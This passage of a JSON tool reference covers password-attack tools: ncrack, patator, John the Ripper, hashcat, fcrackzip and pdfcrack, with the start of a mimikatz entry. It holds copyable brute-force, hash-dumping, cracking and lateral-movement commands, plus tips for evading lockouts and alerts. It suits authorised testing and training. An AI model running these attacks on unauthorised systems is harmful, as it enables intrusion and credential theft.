            "copyable": true
          },
          {
            "detail": "sudo apt install -y ncrack libssl-dev",
            "copyable": true
          },
          {
            "detail": "ncrack --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Kali bundles ncrack; keep protocol modules current via apt upgrade.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y ncrack",
            "copyable": true
          },
          {
            "detail": "ncrack --list",
            "copyable": true
          },
          {
            "detail": "mkdir -p ~/.ncrack",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run the instrumentisto/ncrack container for isolated password spraying.",
        "steps": [
          {
            "detail": "docker pull instrumentisto/ncrack",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/work instrumentisto/ncrack -U /work/users.txt -P /work/pass.txt rdp://10.0.5.21",
            "copyable": true
          },
          {
            "detail": "docker run --rm instrumentisto/ncrack --resume /work/ncrack.restore",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "SSH brute force",
        "command": "ncrack -p 22 --user admin -P passwords.txt 192.168.1.100",
        "notes": []
      },
      {
        "description": "RDP cracking",
        "command": "ncrack -p 3389 --user admin -P passwords.txt 192.168.1.100",
        "notes": []
      },
      {
        "description": "Multiple protocols",
        "command": "ncrack -p ssh:22,rdp:3389 --user admin -P passwords.txt 192.168.1.100",
        "notes": []
      },
      {
        "description": "HTTP basic auth",
        "command": "ncrack -p http --user admin -P passwords.txt https://example.com",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-p",
        "description": "Port and protocol"
      },
      {
        "flag": "--user",
        "description": "Username"
      },
      {
        "flag": "-P",
        "description": "Password file"
      },
      {
        "flag": "-U",
        "description": "Username file"
      },
      {
        "flag": "-T",
        "description": "Timing template"
      },
      {
        "flag": "-f",
        "description": "Stop when found"
      },
      {
        "flag": "-v",
        "description": "Verbose output"
      },
      {
        "flag": "-o",
        "description": "Output file"
      }
    ],
    "operational_tips": [
      "Use timing templates to balance speed and stealth.",
      "Focus on high-value targets for authentication testing.",
      "Document all discovered credentials securely.",
      "Be aware of account lockout policies."
    ],
    "step_sequences": [
      {
        "title": "Parallel RDP guessing",
        "steps": [
          {
            "title": "Confirm exposure",
            "details": "Validate RDP is enabled and note if Network Level Authentication is required.",
            "command": "xfreerdp /v:10.0.5.21 /cert-ignore /u:dummy"
          },
          {
            "title": "Run ncrack",
            "details": "Use pair-wise username/password lists and limit concurrent logons with CL/UL parameters.",
            "command": "ncrack -U users.txt -P pass.txt rdp://10.0.5.21,CL=3,UL=2 -gto 30"
          },
          {
            "title": "Monitor restore file",
            "details": "Watch ncrack.restore for throttling or completed hosts.",
            "command": "tail -f ncrack.restore"
          },
          {
            "title": "Validate access",
            "details": "Confirm the credential with WinRM, RDP, or SMB login before reporting.",
            "command": "evil-winrm -i 10.0.5.21 -u alice -p 'NcrackHit!'"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Port scan \u2192 ncrack \u2192 WinRM shell",
        "stages": [
          {
            "label": "Identify exposed hosts",
            "description": "Scan for TCP/3389 or other remote management services.",
            "command": "nmap -sV -p 3389,5985 10.0.5.0/24 -oG manage.gnmap"
          },
          {
            "label": "Credential attack",
            "description": "Only target systems confirmed to expose the service to minimize noise.",
            "command": "grep 3389/open manage.gnmap | awk '{print $2}' > rdp_hosts.txt && ncrack -U users.txt -P pass.txt -iL rdp_hosts.txt rdp"
          },
          {
            "label": "Lateral movement",
            "description": "Leverage recovered credentials via Evil-WinRM or Impacket psExec.",
            "command": "evil-winrm -i 10.0.5.34 -u svc_sql -p 'NcrackHit!'"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Discovered credentials on rdp://10.0.5.21",
        "meaning": "A valid pair was found; capture the tuple and cease attacks on that host.",
        "severity": "high"
      },
      {
        "indicator": "WARNING: Service rdp on 10.0.5.21 timed out",
        "meaning": "The endpoint is throttling; lower concurrency or pause before retrying.",
        "severity": "warning"
      },
      {
        "indicator": "No connections requested",
        "meaning": "Command syntax error or missing lists; verify -U/-P arguments and protocols.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Pairwise credential testing",
        "scenario": "Replay hashes or dumped credentials that should stay paired instead of permuting.",
        "command": "ncrack -U combo.txt ssh",
        "notes": [
          "combo.txt contains user:password per line; combine with --passwords-first for priority hits.",
          "Useful when replaying credentials pulled from previous compromises."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Ncrack guide",
        "url": "https://nmap.org/ncrack/guide.html",
        "description": "Official manual and module syntax."
      }
    ]
  },
  {
    "id": "patator",
    "name": "Patator",
    "summary": "Patator is a multi-purpose brute-forcer that supports many protocols and services with a modular design.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install patator and ensure python3 modules (requests, pyopenssl) are available for HTTP/IMAP plugins.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y patator python3-requests",
            "copyable": true
          },
          {
            "detail": "patator --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Patator is preinstalled; sync /usr/share/patator modules from the upstream git repo.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y patator",
            "copyable": true
          },
          {
            "detail": "cd /usr/share/patator && sudo git pull",
            "copyable": true
          },
          {
            "detail": "patator -l",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Leverage a Kali container when you cannot install patator locally.",
        "steps": [
          {
            "detail": "docker pull kalilinux/kali-rolling",
            "copyable": true
          },
          {
            "detail": "docker run --rm -it -v $(pwd):/work kalilinux/kali-rolling bash -lc 'apt update && apt install -y patator'",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/work kalilinux/kali-rolling patator http_fuzz url=https://target/login method=POST body='username=FILE0&password=FILE1' 0=/work/users.txt 1=/work/pass.txt",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "SSH brute force",
        "command": "patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=/path/to/passwords.txt",
        "notes": []
      },
      {
        "description": "HTTP form brute force",
        "command": "patator http_fuzz url=https://example.com/login.php method=POST body='user=COMBO00&pass=COMBO01' 0=/path/to/users.txt 1=/path/to/passwords.txt",
        "notes": []
      },
      {
        "description": "FTP brute force",
        "command": "patator ftp_login host=192.168.1.100 user=admin password=FILE0 0=/path/to/passwords.txt",
        "notes": []
      },
      {
        "description": "Dictionary attack on URL",
        "command": "patator http_fuzz url=https://example.com/FUZZ 0=/path/to/wordlist.txt -x ignore:code=404",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "ssh_login",
        "description": "SSH login module"
      },
      {
        "flag": "http_fuzz",
        "description": "HTTP fuzzing module"
      },
      {
        "flag": "ftp_login",
        "description": "FTP login module"
      },
      {
        "flag": "-x",
        "description": "Filter results"
      },
      {
        "flag": "-l",
        "description": "Log file"
      },
      {
        "flag": "-t",
        "description": "Threads"
      },
      {
        "flag": "-d",
        "description": "Delay between requests"
      }
    ],
    "operational_tips": [
      "Use filters to reduce noise and focus on relevant results.",
      "Adjust thread count to balance speed and detection.",
      "Log all attempts for analysis and documentation.",
      "Test with different payload combinations."
    ],
    "step_sequences": [
      {
        "title": "HTTP form brute force",
        "steps": [
          {
            "title": "Capture baseline request",
            "details": "Use Burp to export the HTTP POST request and note success/failure strings.",
            "command": "cp ~/burp/login.req request.req"
          },
          {
            "title": "Run patator",
            "details": "Reference the request body and instruct patator which response codes equal success.",
            "command": "patator http_fuzz url=https://target/login method=POST body='username=FILE0&password=FILE1&csrf=STATIC' 0=users.txt 1=passes.txt accept_cookie=1 follow=1 -x ignore:code=401 -x retry:code=429"
          },
          {
            "title": "Process hits",
            "details": "Patator flags success in the LAST column; replay manually to confirm.",
            "command": "grep -v '#code=401' patator.log"
          },
          {
            "title": "Document evidence",
            "details": "Save patator.log and sanitized request templates to engagement notes.",
            "command": "cp patator.log ~/engagement/evidence/hcc-login.log"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Wordlist prep \u2192 Patator \u2192 Credential reuse checks",
        "stages": [
          {
            "label": "Generate focused wordlist",
            "description": "Use Crunch or CeWL to craft organization-specific passwords.",
            "command": "crunch 8 10 -t ????2024 -o focused.txt"
          },
          {
            "label": "Patator attack",
            "description": "Execute http_fuzz/ssh_login modules depending on the service.",
            "command": "patator ssh_login host=git.target.local user=FILE0 password=FILE1 0=users.txt 1=focused.txt -x ignore:mesg='Authentication failed'"
          },
          {
            "label": "Reuse detection",
            "description": "Feed hits into BloodHound or Kerberoasting workflows to assess blast radius.",
            "command": "bloodhound-python -c All -u alice -p 'RecoveredPass!' -d corp.local"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "code=200 size=4121 time=0.42 req=5",
        "meaning": "Likely failure response; compare with known success signatures.",
        "severity": "info"
      },
      {
        "indicator": "code=302 size=0 time=0.31 req=17",
        "meaning": "Redirects often signal a successful login\u2014replay the request to confirm.",
        "severity": "medium"
      },
      {
        "indicator": "retry: code=429",
        "meaning": "Rate limiting encountered; slow requests or rotate source IPs.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Multi-factor aware retries",
        "scenario": "Respect conditional lockouts by inserting sleeps or custom retries per user.",
        "command": "patator http_fuzz ... --timeout=4 --max-retries=1 --sleep=2",
        "notes": [
          "Combine --sleep and --max-retries to stay below help-desk alert thresholds.",
          "Use user_pass_key option to line up specific password guesses per user."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Patator project",
        "url": "https://github.com/lanjelot/patator",
        "description": "Module documentation and examples."
      }
    ]
  },
  {
    "id": "john",
    "name": "John the Ripper",
    "summary": "John the Ripper is a fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install John the Ripper jumbo build with wordlists and helper tools like unshadow.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y john john-data wordlists",
            "copyable": true
          },
          {
            "detail": "john --list=formats | head",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Kali ships jumbo John; sync /usr/share/wordlists and rulesets before engagements.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y john",
            "copyable": true
          },
          {
            "detail": "sudo gzip -d /usr/share/wordlists/rockyou.txt.gz",
            "copyable": true
          },
          {
            "detail": "john --test",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use a Kali container for cracking when the host lacks GPU access or packages.",
        "steps": [
          {
            "detail": "docker pull kalilinux/kali-rolling",
            "copyable": true
          },
          {
            "detail": "docker run --rm -it -v $(pwd):/hashes kalilinux/kali-rolling bash -lc 'apt update && apt install -y john'",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/hashes kalilinux/kali-rolling john /hashes/ntlm.txt --wordlist=/usr/share/wordlists/rockyou.txt",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic password cracking",
        "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        "notes": []
      },
      {
        "description": "Show cracked passwords",
        "command": "john --show hash.txt",
        "notes": []
      },
      {
        "description": "Use specific format",
        "command": "john --format=raw-md5 --wordlist=wordlist.txt hash.txt",
        "notes": []
      },
      {
        "description": "Incremental mode attack",
        "command": "john --incremental hash.txt",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "--wordlist",
        "description": "Dictionary attack"
      },
      {
        "flag": "--incremental",
        "description": "Incremental mode"
      },
      {
        "flag": "--format",
        "description": "Specify hash format"
      },
      {
        "flag": "--show",
        "description": "Show cracked passwords"
      },
      {
        "flag": "--rules",
        "description": "Apply word mangling rules"
      },
      {
        "flag": "--single",
        "description": "Single crack mode"
      },
      {
        "flag": "--mask",
        "description": "Mask attack mode"
      }
    ],
    "operational_tips": [
      "Use wordlists for initial dictionary attacks.",
      "Apply rules for better password variations.",
      "Try different formats based on hash type.",
      "Save cracked passwords securely for later use."
    ],
    "step_sequences": [
      {
        "title": "Credential dump to cracked password",
        "steps": [
          {
            "title": "Normalize hashes",
            "details": "Combine /etc/passwd and /etc/shadow or use secretsdump output for John.",
            "command": "unshadow passwd shadow > combined.hash"
          },
          {
            "title": "Run primary attack",
            "details": "Use wordlist plus rules for fast wins before brute force.",
            "command": "john --wordlist=/usr/share/wordlists/rockyou.txt --rules=KoreLogic combined.hash"
          },
          {
            "title": "Display cracked credentials",
            "details": "Export cracked passwords for reporting and reuse detection.",
            "command": "john --show combined.hash"
          },
          {
            "title": "Replay credentials",
            "details": "Test cracked passwords against other services to detect reuse.",
            "command": "crackmapexec smb 10.0.5.0/24 -u alice -p 'CrackedPass1!'"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Hash dump \u2192 John \u2192 Lateral movement",
        "stages": [
          {
            "label": "Harvest hashes",
            "description": "Use impacket-secretsdump or mimikatz to pull credential material.",
            "command": "secretsdump.py corp.local/backup:Passw0rd@dc01"
          },
          {
            "label": "Crack with John",
            "description": "Focus on NTLM/NetNTLMv2 formats first for Windows reuse.",
            "command": "john netntlmv2.txt --format=netntlmv2 --wordlist=corp.txt --rules=best64"
          },
          {
            "label": "Reuse success",
            "description": "Feed cracked creds into Evil-WinRM or run targeted sprays.",
            "command": "evil-winrm -i 10.0.5.23 -u backup -p 'Winter2024!'"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Loaded 12 password hashes with 12 different salts",
        "meaning": "John parsed the file correctly; note the count to track cracking progress.",
        "severity": "info"
      },
      {
        "indicator": "guesses: 3 time: 0:00:10:34",
        "meaning": "Three passwords recovered so far; consider switching to mask attacks if plateauing.",
        "severity": "info"
      },
      {
        "indicator": "Session aborted",
        "meaning": "Cracking stopped unexpectedly; resume with --restore using the session file.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Forked NetNTLMv2 cracking",
        "scenario": "Distribute CPU cores across NetNTLMv2 hashes for faster results when GPUs are unavailable.",
        "command": "john netntlmv2.txt --format=netntlmv2 --wordlist=rockyou.txt --rules --fork=4",
        "notes": [
          "Forking uses separate processes, so monitor CPU load and adjust accordingly.",
          "Store --session files per engagement to resume after breaks."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "John jumbo wiki",
        "url": "https://github.com/openwall/john",
        "description": "Formats, rules, and build notes."
      }
    ]
  },
  {
    "id": "hashcat",
    "name": "Hashcat",
    "summary": "Hashcat is the world's fastest password cracker, supporting hundreds of hash types with GPU acceleration.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install hashcat and verify OpenCL/CUDA drivers for GPU cracking.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y hashcat",
            "copyable": true
          },
          {
            "detail": "hashcat -I",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Kali bundles hashcat; keep GPU drivers updated and extract rockyou wordlists.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y hashcat",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y nvidia-driver",
            "copyable": true
          },
          {
            "detail": "hashcat -b",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use the official hashcat container with --device to access GPUs or run CPU-only cracking.",
        "steps": [
          {
            "detail": "docker pull hashcat/hashcat",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/hashes hashcat/hashcat -m 13100 /hashes/ntlm.hash /hashes/wordlist.txt",
            "copyable": true
          },
          {
            "detail": "docker run --gpus=all --rm -v $(pwd):/hashes hashcat/hashcat -m 13100 /hashes/ntlm.hash -a 3 ?u?l?l?l?d?d",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic hash cracking",
        "command": "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
        "notes": []
      },
      {
        "description": "Show cracked passwords",
        "command": "hashcat -m 0 hash.txt --show",
        "notes": []
      },
      {
        "description": "Mask attack",
        "command": "hashcat -m 0 -a 3 hash.txt ?u?l?d?d?d?d",
        "notes": []
      },
      {
        "description": "Rule-based attack",
        "command": "hashcat -m 0 -a 0 -r rules/best64.rule hash.txt wordlist.txt",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-m",
        "description": "Hash type"
      },
      {
        "flag": "-a",
        "description": "Attack mode"
      },
      {
        "flag": "--show",
        "description": "Show cracked passwords"
      },
      {
        "flag": "-r",
        "description": "Rules file"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "--force",
        "description": "Ignore warnings"
      },
      {
        "flag": "-D",
        "description": "OpenCL devices"
      }
    ],
    "operational_tips": [
      "Use appropriate hash type (-m) for your target.",
      "GPU acceleration significantly speeds up cracking.",
      "Combine wordlists with rules for better success.",
      "Save cracked hashes and document results."
    ],
    "step_sequences": [
      {
        "title": "Hashcat cracking workflow",
        "steps": [
          {
            "title": "Identify hash mode",
            "details": "Use hashid or documentation to map hashes to the correct -m value.",
            "command": "hashid hash.txt"
          },
          {
            "title": "Run wordlist attack",
            "details": "Start with targeted wordlists plus rules for quick wins.",
            "command": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule --session=corp"
          },
          {
            "title": "Switch to mask attack",
            "details": "After wordlists plateau, use masks that reflect org password policy.",
            "command": "hashcat -m 13100 hashes.txt -a 3 '?u?l?l?l?d?d' --increment"
          },
          {
            "title": "Review recovered credentials",
            "details": "Export cracked passwords for reporting and reuse detection.",
            "command": "hashcat --show -m 13100 hashes.txt > cracked.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Hash dump \u2192 Hashcat \u2192 Post-ex",
        "stages": [
          {
            "label": "Collect hashes",
            "description": "Use secretsdump or mimikatz to gather NTLM/NetNTLMv2 hashes.",
            "command": "secretsdump.py corp.local/backup:Passw0rd@dc01"
          },
          {
            "label": "Crack with GPU",
            "description": "Leverage hashcat on a GPU rig for rapid results.",
            "command": "hashcat -m 1000 ntlm.hash -a 0 rockyou.txt --status --status-timer=60"
          },
          {
            "label": "Lateral movement",
            "description": "Use cracked passwords with Impacket or Evil-WinRM to expand access.",
            "command": "wmiexec.py corp.local/alice:'CrackedPass1!'@sql01"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Status........... Running",
        "meaning": "Hashcat is actively cracking; monitor status timers for ETA.",
        "severity": "info"
      },
      {
        "indicator": "Recovered........ 2/5 (40.00%)",
        "meaning": "Two of five hashes cracked; consider switching attack mode if progress stalls.",
        "severity": "info"
      },
      {
        "indicator": "Exhausted",
        "meaning": "Current attack key space completed; change wordlists or masks before resuming.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Hybrid mask + rules",
        "scenario": "Detect password reuse patterns like Season+Year! appended to names.",
        "command": "hashcat -m 13100 hashes.txt -a 6 names.txt '?d?d!Summer' --rules-file=rules/combinator.rule",
        "notes": [
          "Hybrid attacks combine dictionary terms with structured suffixes or prefixes.",
          "Tune --gpu-temp-retain to protect hardware during long runs."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Hashcat wiki",
        "url": "https://hashcat.net/wiki/",
        "description": "Mode list, attack strategies, and tuning."
      }
    ]
  },
  {
    "id": "fcrackzip",
    "name": "FCrackZip",
    "summary": "FCrackZip is a fast password cracker for ZIP archives that supports both brute force and dictionary attacks.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install fcrackzip and ensure unzip is present for verification.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y fcrackzip unzip",
            "copyable": true
          },
          {
            "detail": "fcrackzip --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Kali packages fcrackzip; sync Seclists or custom dictionaries for cracking.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y fcrackzip seclists",
            "copyable": true
          },
          {
            "detail": "cp /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt ./ziplist.txt",
            "copyable": true
          },
          {
            "detail": "fcrackzip -b",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use a minimal container when cracking on isolated hosts.",
        "steps": [
          {
            "detail": "docker pull kalilinux/kali-rolling",
            "copyable": true
          },
          {
            "detail": "docker run --rm -it -v $(pwd):/work kalilinux/kali-rolling bash -lc 'apt update && apt install -y fcrackzip'",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/work kalilinux/kali-rolling fcrackzip -D -p /work/ziplist.txt /work/secrets.zip",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Dictionary attack",
        "command": "fcrackzip -D -p wordlist.txt archive.zip",
        "notes": []
      },
      {
        "description": "Brute force attack",
        "command": "fcrackzip -b -c 'aA1' -l 1-6 archive.zip",
        "notes": []
      },
      {
        "description": "Use uncompressed size as password",
        "command": "fcrackzip -u archive.zip",
        "notes": []
      },
      {
        "description": "Verbose mode",
        "command": "fcrackzip -v -D -p wordlist.txt archive.zip",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-D",
        "description": "Dictionary attack"
      },
      {
        "flag": "-p",
        "description": "Password file"
      },
      {
        "flag": "-b",
        "description": "Brute force"
      },
      {
        "flag": "-c",
        "description": "Character set"
      },
      {
        "flag": "-l",
        "description": "Password length"
      },
      {
        "flag": "-u",
        "description": "Use uncompressed size"
      },
      {
        "flag": "-v",
        "description": "Verbose output"
      }
    ],
    "operational_tips": [
      "Try uncompressed size method first - very fast.",
      "Use good wordlists for dictionary attacks.",
      "Start with short passwords for brute force.",
      "Combine multiple techniques for best results."
    ],
    "step_sequences": [
      {
        "title": "Cracking a protected ZIP",
        "steps": [
          {
            "title": "Inspect archive",
            "details": "List compressed files to understand size and target file names.",
            "command": "zipinfo secrets.zip"
          },
          {
            "title": "Run dictionary attack",
            "details": "Use targeted wordlists first before switching to brute force.",
            "command": "fcrackzip -D -p ziplist.txt -u secrets.zip"
          },
          {
            "title": "Brute force fallback",
            "details": "Limit character sets and lengths to stay within scope.",
            "command": "fcrackzip -b -c 1aA -l 6-8 secrets.zip"
          },
          {
            "title": "Validate password",
            "details": "Extract files using the recovered password and store evidence.",
            "command": "unzip -P 'RecoveredPass' secrets.zip"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Wordlist creation \u2192 fcrackzip \u2192 Data review",
        "stages": [
          {
            "label": "Build custom list",
            "description": "Use CeWL/Crunch to tailor words to the target organization.",
            "command": "cewl -d 2 -m 5 https://portal.target -w ziplist.txt"
          },
          {
            "label": "Crack archive",
            "description": "Apply fcrackzip with dictionary or brute-force attacks.",
            "command": "fcrackzip -D -p ziplist.txt -u finance.zip"
          },
          {
            "label": "Analyze contents",
            "description": "Open recovered documents for credentials or additional context.",
            "command": "unzip -P $(cat cracked.txt) finance.zip"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "PASSWORD FOUND!!!!: pw == Secret123",
        "meaning": "Successful crack; record the password and archive hash in notes.",
        "severity": "high"
      },
      {
        "indicator": "possible pw found: Winter2024",
        "meaning": "Potential match; verify with unzip before declaring success.",
        "severity": "medium"
      },
      {
        "indicator": "skipping encryption method",
        "meaning": "The archive uses compression not supported by current build; update tool or use 7zip.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Mask attack with known prefixes",
        "scenario": "Passwords that follow a corporate naming scheme like 'Team-####'.",
        "command": "fcrackzip -b -c aA1 -p Team-???? secrets.zip",
        "notes": [
          "Use -p to define pattern-based brute force instead of dictionary attacks.",
          "Combine with -u so fcrackzip verifies candidates automatically."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "fcrackzip man page",
        "url": "https://linux.die.net/man/1/fcrackzip",
        "description": "Option reference and usage notes."
      }
    ]
  },
  {
    "id": "pdfcrack",
    "name": "PDFCrack",
    "summary": "PDFCrack is a tool for cracking password-protected PDF files using dictionary and brute force attacks.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install pdfcrack for user and owner password recovery on PDF files.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y pdfcrack",
            "copyable": true
          },
          {
            "detail": "pdfcrack -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Kali includes pdfcrack; keep wordlists ready for document attacks.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y pdfcrack",
            "copyable": true
          },
          {
            "detail": "cp /usr/share/wordlists/rockyou.txt ./pdf_words.txt",
            "copyable": true
          },
          {
            "detail": "pdfcrack -l 4 -u protected.pdf",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run pdfcrack from a container for isolated forensic work.",
        "steps": [
          {
            "detail": "docker pull kalilinux/kali-rolling",
            "copyable": true
          },
          {
            "detail": "docker run --rm -it -v $(pwd):/docs kalilinux/kali-rolling bash -lc 'apt update && apt install -y pdfcrack'",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/docs kalilinux/kali-rolling pdfcrack -w /docs/pdf_words.txt /docs/protected.pdf",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Dictionary attack",
        "command": "pdfcrack -f document.pdf -w wordlist.txt",
        "notes": []
      },
      {
        "description": "Brute force attack",
        "command": "pdfcrack -f document.pdf -b -c 'aA1' -n 6",
        "notes": []
      },
      {
        "description": "Continue from saved state",
        "command": "pdfcrack -f document.pdf -s savedstate.txt",
        "notes": []
      },
      {
        "description": "Test specific password",
        "command": "pdfcrack -f document.pdf -p 'testpass'",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-f",
        "description": "PDF file"
      },
      {
        "flag": "-w",
        "description": "Wordlist file"
      },
      {
        "flag": "-b",
        "description": "Brute force"
      },
      {
        "flag": "-c",
        "description": "Character set"
      },
      {
        "flag": "-n",
        "description": "Maximum length"
      },
      {
        "flag": "-s",
        "description": "Save state file"
      },
      {
        "flag": "-p",
        "description": "Test password"
      }
    ],
    "operational_tips": [
      "Save state to resume long-running attacks.",
      "Try dictionary attacks before brute force.",
      "Use character sets based on password policies.",
      "Document cracked passwords for evidence."
    ],
    "step_sequences": [
      {
        "title": "Cracking PDF user password",
        "steps": [
          {
            "title": "Gather metadata",
            "details": "Use pdfinfo to learn encryption strength and page count.",
            "command": "pdfinfo protected.pdf"
          },
          {
            "title": "Run dictionary attack",
            "details": "Start with wordlists derived from the target organization.",
            "command": "pdfcrack -w pdf_words.txt protected.pdf"
          },
          {
            "title": "Switch to incremental",
            "details": "For short numeric pins or badges, attempt incremental brute force.",
            "command": "pdfcrack -c 0123456789 -l 4 -u protected.pdf"
          },
          {
            "title": "Validate password",
            "details": "Open the document with the recovered password and archive a sanitized copy.",
            "command": "qpdf --password=RecoveredPass --decrypt protected.pdf unlocked.pdf"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Wordlist harvest \u2192 pdfcrack \u2192 Data extraction",
        "stages": [
          {
            "label": "Collect candidate words",
            "description": "Run CeWL or Crunch to generate likely terms.",
            "command": "cewl -m 5 https://reports.target -w pdf_words.txt"
          },
          {
            "label": "Crack PDF",
            "description": "Attempt dictionary then incremental attacks.",
            "command": "pdfcrack -w pdf_words.txt -u finance.pdf"
          },
          {
            "label": "Extract evidence",
            "description": "Decrypt the PDF and capture relevant pages for reporting.",
            "command": "qpdf --password=$(cat cracked_pw.txt) --decrypt finance.pdf finance_unlocked.pdf"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "found user-password: password",
        "meaning": "User password cracked; document and test the credential.",
        "severity": "high"
      },
      {
        "indicator": "Max length reached. No solution found.",
        "meaning": "Incremental search exhausted; increase length or character set if still in scope.",
        "severity": "warning"
      },
      {
        "indicator": "Trying unicode passwords",
        "meaning": "pdfcrack switched to Unicode mode; ensure wordlists include UTF-8 entries.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Resume long-running sessions",
        "scenario": "Cracking large documents can take days; resume from saved session files.",
        "command": "pdfcrack -w pdf_words.txt -s session.state protected.pdf",
        "notes": [
          "Use Ctrl+C to save progress; rerun with -s to continue where you stopped.",
          "Segment work by assigning different length ranges to multiple operators."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "pdfcrack project",
        "url": "https://pdfcrack.sourceforge.net/",
        "description": "Usage reference and release notes."
      }
    ]
  },
  {
    "id": "mimikatz",
    "name": "Mimikatz",
    "summary": "Mimikatz is a powerful Windows post-exploitation tool that can extract plain text passwords, hash, PIN code and kerberos tickets from memory.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Pre-stage the latest signed release for transfer to Windows hosts.",
        "steps": [
          {
            "detail": "mkdir -p ~/loot/mimikatz && cd ~/loot/mimikatz",
            "copyable": true
          },
          {
            "detail": "wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip",
            "copyable": true
          },
          {
            "detail": "unzip mimikatz_trunk.zip && sha256sum mimikatz.exe",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Kali stores binaries under /usr/share/windows-resources; copy them to staging shares.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y mimikatz",
